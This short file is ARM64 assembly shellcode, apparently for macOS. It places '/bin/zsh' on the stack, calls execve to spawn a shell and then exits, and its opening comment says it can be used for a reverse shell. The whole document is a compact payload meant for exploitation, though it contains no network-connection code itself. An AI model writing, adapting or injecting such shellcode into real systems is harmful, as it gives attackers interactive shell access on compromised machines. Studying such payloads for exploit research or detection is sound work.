//launch a zsh shell , can be used for reverse shell
.global _start
.align 4
_start:

    mov     x3, #0x622F              //move "/bin/zsh" into x3 "2F 62 69 6E 2F 7A 73 68"
    movk    x3, #0x6E69, lsl#16
    movk    x3, #0x7A2F, lsl#32
    movk    x3, #0x6873, lsl#48
    stp     x3, xzr, [sp, #-16]!
    add     x0, sp, xzr
    stp     x0, xzr, [sp, #-16]!
    add     x1, sp, xzr
    mov     x2, xzr
    mov     x16, #59
    svc     0xFFFF

exit:
    mov     x0, #0      // error code parameter for exit syscall
    mov     x16, #1     // exit syscall value
    svc     0xFFF        // supervisor call
